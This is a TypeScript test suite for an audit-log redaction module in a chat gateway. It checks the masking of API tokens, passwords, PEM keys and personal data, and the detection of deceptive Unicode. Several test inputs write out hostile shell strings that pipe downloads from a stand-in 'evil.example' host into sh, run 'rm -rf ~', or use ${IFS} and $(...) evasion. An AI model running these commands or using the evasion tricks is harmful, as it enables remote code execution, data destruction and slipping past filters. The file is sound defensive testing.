import test from 'node:test'
import assert from 'node:assert/strict'
import {mkdtemp,readFile,rm,stat} from 'node:fs/promises'
import {existsSync} from 'node:fs'
import {tmpdir} from 'node:os'
import {join} from 'node:path'
import {createAudit,deceptiveText,entropyHit,redact,redactionRules,type ImAuditRow} from '../src/core/audit.ts'

async function withTemp(run:(dir:string)=>Promise<void>):Promise<void>{
 const root=await mkdtemp(join(tmpdir(),'teloa-im-audit-'))
 try{await run(join(root,'im-gateway'))}finally{await rm(root,{recursive:true,force:true})}
}

const base:ImAuditRow={at:'2026-09-26T00:00:00.000Z',channelId:'telegram',chatId:'42',imUserId:'u1',action:'message',text:'你好',result:'ok'}
const lines=async(dir:string)=>(await readFile(join(dir,'im-audit.jsonl'),'utf8')).trim().split('\n').map(line=>JSON.parse(line) as Record<string,unknown>)

test('9a. pair／pair-rejected 行 text 中的配对码数字替换为 ******',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 await audit.record({...base,action:'pair',text:'/pair 123456',result:'bound'})
 await audit.record({...base,action:'pair-rejected',text:'/pair 654 321',result:'invalid'})
 const [pair,rejected]=await lines(dir)
 assert.equal(pair!.text,'/pair ******')
 assert.equal(rejected!.text,'/pair *** ***')
 const raw=await readFile(join(dir,'im-audit.jsonl'),'utf8')
 assert.ok(!raw.includes('123456')&&!raw.includes('654'))
}))

test('9b. L1：任一字段含凭据形态 → 命中片段替换为 [redacted] 后照常写入，result 标注 +redacted（不整行拒写，避免借凭据形态规避审计）',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 const cases:[Partial<ImAuditRow>,string][]=[
  [{text:'token xoxb-1234567890-abcdefghij'},'xoxb-1234567890-abcdefghij'],
  [{text:'xoxp-123-456-789-abcdef'},'xoxp-123-456-789-abcdef'],
  [{text:'slack app xapp-1-A0123-4567-abcdef'},'xapp-1-A0123-4567-abcdef'],
  [{text:'123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw'},'AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw'],
  [{text:'key sk-proj-abcdefgh12345678'},'sk-proj-abcdefgh12345678'],
  [{text:'ghp_abcdefghijklmnopqrstuvwxyz0123456789'},'ghp_abcdefghijklmnopqrstuvwxyz0123456789'],
  [{text:'github_pat_11ABCDEFG0abcdefghijk'},'github_pat_11ABCDEFG0abcdefghijk'],
  [{text:'aws AKIAIOSFODNN7EXAMPLE'},'AKIAIOSFODNN7EXAMPLE'],
  [{text:'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9abcdef'},'eyJhbGciOiJIUzI1NiJ9abcdef'],
  [{text:'飞书 t-g1044ghJRUIJJ5ELPNWT6KB2ZXCFSDGSCS5VJKVK'},'g1044ghJRUIJJ5ELPNWT6KB2ZXCFSDGSCS5VJKVK'],
  [{text:'u-4Hx8TtS3F5QbTrLQwZkPAbcdEfgh1234'},'4Hx8TtS3F5QbTrLQwZkPAbcdEfgh1234'],
  [{text:'app_secret=Zx8kQ2m'},'Zx8kQ2m'],
  [{text:'password: hunter22'},'hunter22'],
  [{text:'"access_token":"abcd1234"'},'abcd1234'],
  [{text:'看这个 Kp9vT2qLx7Rm4Nw8Zs1Yb6Hc3Jd5Fg0A 好吗'},'Kp9vT2qLx7Rm4Nw8Zs1Yb6Hc3Jd5Fg0A'],
  [{targetId:'cli_a1b2c3d4e5f60718'},'cli_a1b2c3d4e5f60718'],
  [{imUserId:'xoxa-2-abcdefghij'},'xoxa-2-abcdefghij'],
 ]
 for(const [row] of cases)await audit.record({...base,...row})
 const raw=await readFile(join(dir,'im-audit.jsonl'),'utf8')
 const rows=await lines(dir)
 assert.equal(rows.length,cases.length)
 cases.forEach(([row,secret],index)=>{
  assert.ok(!raw.includes(secret),secret)
  const [field]=Object.keys(row) as (keyof ImAuditRow)[]
  assert.match(String(rows[index]![field!]),/\[redacted\]/,JSON.stringify(row))
  assert.equal(rows[index]!.result,'ok+redacted')
 })
 assert.equal(rows[14]!.text,'看这个 [redacted] 好吗','片段替换，其余原文保留')
}))

test('9b 反例：普通词、标识与链接不拒写',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 const ok=[
  {text:'用 cli_tool 跑一下'},
  {text:'买了件 t-shirt，还有 u-turn'},
  {text:'我的 token 过期了，password 忘了'},
  {text:'task-list 与 desk-lamp，Bearer of news'},
  {text:'PDF_Table_Extraction_Tool_For_Reports_Version'},
  {text:'看 https://example.com/some/long/path/abcdefghijklmnopqrstuvwxyz0123456789'},
  {text:'提交 3f786850e387550fdab836ed7e6dc881de23001b'},
  {text:'编号 123e4567-e89b-12d3-a456-426614174000'},
  {chatId:'oc_5ad573a6a5ab5c6d0b8a1b8c8e3d0f2a',imUserId:'ou_7d8a6e6df7621556ce0d21922b676706',messageId:'om_dc13264520392913993dd051dba21dcf'},
  {chatId:'C0123456789',imUserId:'U0123ABCDEF'},
 ]
 for(const row of ok)await audit.record({...base,...row})
 const rows=await lines(dir)
 assert.equal(rows.length,ok.length)
 ok.forEach((row,index)=>{for(const [key,value] of Object.entries(row))assert.equal(rows[index]![key],value);assert.equal(rows[index]!.result,'ok')})
}))

test('9c. 写两行 → 文件两行，各含 at/action/result；可选字段缺省不写；文件 0o600',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 await audit.record(base)
 await audit.record({...base,action:'approval-click',messageId:'m1',targetId:'cb1',result:'approved'})
 const rows=await lines(dir)
 assert.equal(rows.length,2)
 for(const row of rows)for(const key of ['at','action','result'])assert.ok(key in row,key)
 assert.equal('messageId' in rows[0]!,false)
 assert.deepEqual(rows[1],{at:base.at,channelId:'telegram',chatId:'42',imUserId:'u1',action:'approval-click',messageId:'m1',targetId:'cb1',text:'你好',result:'approved'})
 assert.equal((await stat(join(dir,'im-audit.jsonl'))).mode&0o777,0o600)
}))

test('普通消息中的 6 位数字不替换（只处理配对行）；并发写入按调用顺序逐行落盘',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 await Promise.all(Array.from({length:20},(_,i)=>audit.record({...base,text:`订单 123456 第 ${i} 条`})))
 const rows=await lines(dir)
 assert.deepEqual(rows.map(row=>row.text),Array.from({length:20},(_,i)=>`订单 123456 第 ${i} 条`))
}))

test('M2 补充凭据形态：Basic／Bearer 令牌、curl -u、mysql -p、URL user:pass@、扩充的键名集合 → 命中片段替换',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 const cases:[string,string,string][]=[
  ['curl -H "Authorization: Basic dXNlcjpwYXNzd29yZA=="','dXNlcjpwYXNzd29yZA==','Basic 头'],
  ['Bearer abc.def','abc.def','短 Bearer 令牌'],
  ['curl -u admin:hunter2 https://x.example','admin:hunter2','curl -u'],
  ['mysql -uroot -phunter22 db','hunter22','mysql -p'],
  ['git clone https://max:s3cret@github.com/x.git','max:s3cret','URL 用户名密码'],
  ['cookie: sessionid=abc123','sessionid=abc123','cookie 键'],
  ['pwd=abcd1234','abcd1234','pwd 键'],
  ['private_key: abcd1234','abcd1234','private_key 键'],
  ['auth=abcd1234','abcd1234','auth 键'],
 ]
 for(const [text] of cases)await audit.record({...base,text})
 const rows=await lines(dir)
 cases.forEach(([,secret,label],index)=>{
  assert.ok(!String(rows[index]!.text).includes(secret),label)
  assert.match(String(rows[index]!.text),/\[redacted\]/,label)
  assert.equal(rows[index]!.result,'ok+redacted',label)
 })
 assert.equal(rows[2]!.text,'curl -u [redacted] https://x.example')
 assert.equal(rows[4]!.text,'git clone https://[redacted]@github.com/x.git')
}))

test('M2 个人信息：邮箱、大陆手机号、18 位身份证号替换为 [redacted]',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 await audit.record({...base,text:'联系 max.luo+im@example.com.cn 或 13812345678，身份证 11010519491231002X'})
 const [row]=await lines(dir)
 assert.equal(row!.text,'联系 [redacted] 或 [redacted]，身份证 [redacted]')
 assert.equal(row!.result,'ok+redacted')
}))

test('M2 反例：普通文本、命令与数字不误伤',()=>withTemp(async dir=>{
 const audit=createAudit(dir)
 const ok=[
  'Bearer of news, Basic information about it',
  'find . -path ./x -print',
  'git push -u origin main',
  'mkdir -p /tmp/x && ls -la',
  '订单号 138123456789，时间戳 1727308800123，电话 12345678901',
  '编号 110105194912310021999',
  '发到 user@localhost 或 @张三',
  'author 是谁，auth 流程如何',
 ]
 for(const text of ok)await audit.record({...base,text})
 const rows=await lines(dir)
 ok.forEach((text,index)=>{assert.equal(rows[index]!.text,text);assert.equal(rows[index]!.result,'ok')})
}))

/** 页内新建「保存草案」的真实参数形态：teloa_create_draft 的 body 是岗位定义 JSON 字符串（验收第 7 步）。 */
const roleDraft={name:'IM审批甲',kind:'employee',scopes:['general'],duty:'负责 IM 审批验收',dataScope:'只读',executionScope:'不执行外部操作',skills:[],knowledge:[],responsibility:{triggers:['收到请求'],autonomousActions:['整理'],confirmationPoints:['保存前确认'],escalationRules:['异常上报'],deliveryChecks:['结果可核对']}}

test('高熵规则只对独立令牌计熵：草案 JSON 结构、驼峰标识符、UUID、哈希摘要不判为凭据',()=>{
 const samples=[
  JSON.stringify(roleDraft),
  JSON.stringify({entity:'role',body:JSON.stringify(roleDraft)}),
  JSON.stringify({entity:'business-object-type',scope:'recruiting',body:JSON.stringify({format:'teloa.business-object-type/v1',id:'candidate',version:'1.0.0',domain:'recruiting',title:'候选人',unit:'人',lead:'name',sourceId:'123e4567-e89b-12d3-a456-426614174000',fields:[{key:'name',label:'姓名',type:'text'}]})}),
  '{"requestId":"123e4567-e89b-12d3-a456-426614174000","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","commit":"3f786850e387550fdab836ed7e6dc881de23001b"}',
  '{"confirmationPointsBeforeEscalation":["a"],"autonomousActionsWithinDataScope":[]}',
 ]
 for(const text of samples){
  assert.equal(redact(text),text,text)
  assert.equal(entropyHit(text),false,text)
 }
})

test('真实凭据形态仍遮蔽：主流前缀、PEM 整块、长随机串；长随机串与 PEM 命中熵规则',()=>{
 const pem=['-----BEGIN RSA PRIVATE KEY-----','MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB','aFDrBz9vFqU4yVKWnU0yh5jZ6e4LNNr0rYhVqFzYFEY=','-----END RSA PRIVATE KEY-----'].join('\n')
 const prefixed=['sk-proj-abcdefgh12345678','ghp_abcdefghijklmnopqrstuvwxyz0123456789','xoxb-1234567890-abcdefghij','xoxp-123-456-789-abcdef','AKIAIOSFODNN7EXAMPLE']
 for(const secret of prefixed){
  const text=JSON.stringify({entity:'role',body:JSON.stringify({...roleDraft,duty:`用 ${secret} 调用`})})
  assert.ok(!redact(text).includes(secret),secret)
  assert.match(redact(text),/\[redacted\]/,secret)
 }
 for(const [text,secret] of [[pem,'aFDrBz9vFqU4yVKWnU0yh5jZ6e4LNNr0rYhVqFzYFEY='],['{"note":"key Kp9vT2qLx7Rm4Nw8Zs1Yb6Hc3Jd5Fg0A"}','Kp9vT2qLx7Rm4Nw8Zs1Yb6Hc3Jd5Fg0A'],['{"a":"Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3ggfCBzaA=="}','Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3ggfCBzaA==']] as const){
  assert.ok(!redact(text).includes(secret),text)
  assert.equal(entropyHit(text),true,text)
 }
 assert.equal(redact(`密钥：\n${pem}\n完`),'密钥：\n[redacted]\n完','PEM 整块遮蔽，末行不足 32 位也不漏')
})

// ── 审查修复 R1 ──
const pemTail='aFDrBz9vFqU4yVKWnU0y=='
const serviceAccount={type:'service_account',project_id:'demo',private_key_id:'k1',private_key:`-----BEGIN PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB\n${pemTail}\n-----END PRIVATE KEY-----\n`,client_email:'bot@demo.iam.gserviceaccount.com'}

test('R1-M1 PEM 先于其他规则整块遮蔽：嵌套 JSON 字符串、美化缩进、转义 \\n 形态都不漏末行与 END 行',()=>{
 for(const text of [JSON.stringify({body:JSON.stringify(serviceAccount)}),JSON.stringify(serviceAccount,null,2),JSON.stringify({entity:'skill',body:JSON.stringify(serviceAccount,null,2)}),serviceAccount.private_key]){
  const safe=redact(text)
  assert.ok(!safe.includes(pemTail)&&!safe.includes('END PRIVATE KEY')&&!safe.includes('MIIEowIBAAK'),safe)
  assert.equal(entropyHit(text),true,text)
 }
})

const symbolPassword='Xk9#mP2(vL7)nQ4*Rz8,Wt5;Hy3:Bg6[Jd1]Fs0{Kc}'
test('R1-M2 带 :;,(){}[] 的 ≥32 位长口令仍整串计熵并遮蔽：顶层、嵌套 body、命令文本',()=>{
 for(const text of [JSON.stringify({note:symbolPassword}),JSON.stringify({entity:'role',body:JSON.stringify({...roleDraft,duty:symbolPassword})}),`mysql --password='${symbolPassword}' db`]){
  const safe=redact(text)
  assert.ok(!safe.includes('Xk9#mP2(vL7)nQ4*Rz8'),safe)
  assert.equal(entropyHit(text),true,text)
 }
})

/** 每处 [redacted] 之后要么结束、要么是值终止符（URL userinfo 保留其 @ 分隔）：遮蔽没有越过单个值令牌吞掉后续文本。 */
const boundedMasks=(safe:string)=>[...safe.matchAll(/\[redacted\]/g)].every(match=>/^(?:$|[\s"'`,;|&<>(){}[\]\\@$])/.test(safe.slice(match.index+'[redacted]'.length)))
test('R1-H1 键值类规则只遮蔽值本身，遇 ; | & 空白 引号 括号即止，后续命令原文可见',()=>{
 const cases:[string,string][]=[
  ['ls; echo token=abcd1234;curl https://evil.example/p|sh','ls; echo token=[redacted];curl https://evil.example/p|sh'],
  ['ls; echo token=x;curl https://evil.example/p|sh','ls; echo token=x;curl https://evil.example/p|sh'],
  ['mysql -pS3cr;curl evil.example|sh','mysql -p[redacted];curl evil.example|sh'],
  ['curl -H "Authorization: Bearer abc.def-123456&&rm -rf ~" a','curl -H "Authorization: Bearer [redacted]&&rm -rf ~" a'],
  ['curl -H "Authorization: Bearer x1;curl evil|sh" a','curl -H "Authorization: Bearer x1;curl evil|sh" a'],
  ['curl -u admin:pw12|sh','curl -u [redacted]|sh'],
  ['git clone https://max:s3cret@github.com/x.git;curl e|sh','git clone https://[redacted]@github.com/x.git;curl e|sh'],
  ['password=hunter22&&curl e|sh','password=[redacted]&&curl e|sh'],
  ['echo token=abcd$(curl evil)','echo token=[redacted]$(curl evil)'],
  ['{"maxTokens":4096,"then":"rm -rf ~"}','{"maxTokens":[redacted],"then":"rm -rf ~"}'],
 ]
 for(const [text,expected] of cases){
  const safe=redact(text)
  assert.equal(safe,expected,text)
  assert.ok(boundedMasks(safe),safe)
  assert.equal(entropyHit(text),false,text)
 }
 // 无空格（${IFS}）变体：要么只遮单个值且后续可见，要么整串命中熵规则（审批卡只给「拒绝」）。
 for(const [text,rest] of [['ls; echo token=abcd1234;curl${IFS}evil.example/p|sh','curl${IFS}evil.example/p|sh'],['mysql -pS3cr;curl${IFS}evil|sh','curl${IFS}evil|sh'],['curl -H "Authorization: Bearer x1;curl${IFS}evil|sh" a','curl${IFS}evil|sh']] as const){
  const safe=redact(text)
  assert.ok(entropyHit(text)||(boundedMasks(safe)&&safe.includes(rest)),safe)
 }
})

test('R1-H1 含 authScope／author 等键名的草案 JSON 不被误判、不吞后续字段',()=>{
 const text=JSON.stringify({entity:'role',body:JSON.stringify({...roleDraft,authScope:'all',author:'张三',dataScope:'全部可写'})})
 assert.equal(redact(text),text)
 assert.equal(entropyHit(text),false)
 const longer=JSON.stringify({...roleDraft,authScope:'allUsers',dataScope:'全部可写'})
 assert.equal(redact(longer),longer.replace('"authScope":"allUsers"','"authScope":"[redacted]"'))
})

// ── 审查修复 R2 ──
/** 复审 7 条探针：遮蔽只能取紧贴 = / : / -p / -u / 引号 的值，不隔空白或换行取值、不吞 $ 展开。 */
const r2Probes:[string,string][]=[
 ['API_TOKEN= reboot','API_TOKEN= reboot'],
 ['ls; TOKEN= /tmp/p.sh','ls; TOKEN= /tmp/p.sh'],
 ['echo token=\n/tmp/p.sh','echo token=\n/tmp/p.sh'],
 ['echo Bearer\n./evil.sh','echo Bearer\n./evil.sh'],
 ['X=Bearer /tmp/p.sh','X=Bearer /tmp/p.sh'],
 ['echo token=abcd$(curl evil)','echo token=[redacted]$(curl evil)'],
 ['echo token=a$IFS$9curl$IFS$9evil|sh','echo token=a$IFS$9curl$IFS$9evil|sh'],
]
/** 每个 [redacted] 前面紧贴 =、:、-p、-u␠、:␠ 或引号（Bearer／Basic 整体遮蔽时紧贴行内空白或行首），不隔换行。 */
const maskAnchored=(safe:string)=>[...safe.matchAll(/\[redacted\]/g)].every(match=>/(?:[=:"']|-p|-u |: |^|[^\n\s][ \t])$/.test(safe.slice(0,match.index)))
test('R2-H1 键值／Bearer／-u 不隔空白或换行取值，$ 为终止符：7 条探针原文可见或只遮紧贴的值',()=>{
 for(const [text,expected] of r2Probes){
  const safe=redact(text)
  assert.equal(safe,expected,JSON.stringify(text))
  assert.ok(maskAnchored(safe),safe)
  assert.equal(entropyHit(text),false,text)
 }
 // 合法写法不受影响。
 for(const [text,expected] of [
  ['apiKey: abcd1234','apiKey: [redacted]'],
  ['api_key = abcd1234','api_key = [redacted]'],
  ['curl -H "Authorization: Bearer tok12345" x','curl -H "Authorization: Bearer [redacted]" x'],
  ['export TOKEN=abcd1234','export TOKEN=[redacted]'],
 ] as const)assert.equal(redact(text),expected,text)
})

// ── 审查修复 R3 ──
test('R3 遮蔽规则元数据：每条规则有名称与样例，样例单独命中本规则；redact 恰按 block → pattern → entropy 顺序套用全部规则',()=>{
 const names=redactionRules.map(rule=>rule.name)
 assert.equal(new Set(names).size,names.length)
 assert.deepEqual([...new Set(redactionRules.map(rule=>rule.kind))],['block','pattern','entropy'])
 for(const rule of redactionRules){
  assert.ok(rule.samples.length>0,rule.name)
  for(const sample of rule.samples){
   assert.notEqual(rule.apply(sample),sample,`${rule.name}: ${sample}`)
   assert.ok(redact(sample).includes('[redacted]'),`${rule.name}: ${sample}`)
  }
 }
})

// ── 审查修复 R5 ──
test('R5 deceptiveText：不可见字符（Cf／默认可忽略）或骨架（NFKC + 去不可见 + 同形映射）含 redacted 即为真；正常中文、整词西里尔不误判',()=>{
 for(const text of ['a\u{200B}b','x\u{AD}y','\u{FEFF}ls','a\u{202E}b','a\u{2066}b','a\u{3164}b','[r\u{435}dacted]','［redacted］','【REDACTED】','r e d a c t e d','[red\u{3B1}cted]'])assert.equal(deceptiveText(text),true,JSON.stringify(text))
 for(const text of ['echo 你好','ls [a-z]*','git commit -m "修复 bug"','reduce data','echo こんにちは ファイル','echo 한국어'])assert.equal(deceptiveText(text),false,JSON.stringify(text))
})

// ── 审查修复 R6 ──
test('R6 deceptiveText 白名单：非 ASCII／非中日韩字母或组合附加符即为真（俄文、带重音拉丁、小型大写、切罗基、表外同形字）',()=>{
 for(const text of ['echo "\u{41F}\u{440}\u{438}\u{432}\u{435}\u{442}"','caf\u{E9}','cafe\u{301}','r\u{332}','\u{280}\u{1D07}','\u{13A1}\u{13AC}','red\u{251}cted','\u{AB47}','\u{3B1}'])assert.equal(deceptiveText(text),true,JSON.stringify(text))
 for(const text of ['ls -la','echo 你好','echo 々'])assert.equal(deceptiveText(text),false,JSON.stringify(text))
})

// ── 审查修复 R7 ──
test('R7 deceptiveText：除 ASCII 空格／制表／换行外的空白类或空白外观字符即为真',()=>{
 for(const text of ['a\u{A0}b','a\u{3000}b','a\u{2028}b','a\r\nb','a\u{B}b','a\u{85}b','a\u{2800}b','a\u{FFA0}b','a\u{1160}b','a\u{1D159}b'])assert.equal(deceptiveText(text),true,JSON.stringify(text))
 for(const text of ['a b','a\tb','a\nb'])assert.equal(deceptiveText(text),false,JSON.stringify(text))
})

// ── 审查修复 R8 ──
test('R8 deceptiveText 完整码位白名单：界外码位即为真，界内（ASCII 可打印＋\\t\\n、中日韩文字、白名单标点）为假',()=>{
 for(const text of ['a\u{7F}b','a\u{9B}b','\u{237A}','\u{212E}','\u{2026}','\u{E000}','\u{FF46}','\u{2460}','\u{1F389}','\u{3010}'])assert.equal(deceptiveText(text),true,JSON.stringify(text))
 for(const text of ['ls -la\techo\n','你好，世界。','「」『』、。！（）：；？・','한국어','\u{3400}\u{F900}'])assert.equal(deceptiveText(text),false,JSON.stringify(text))
})
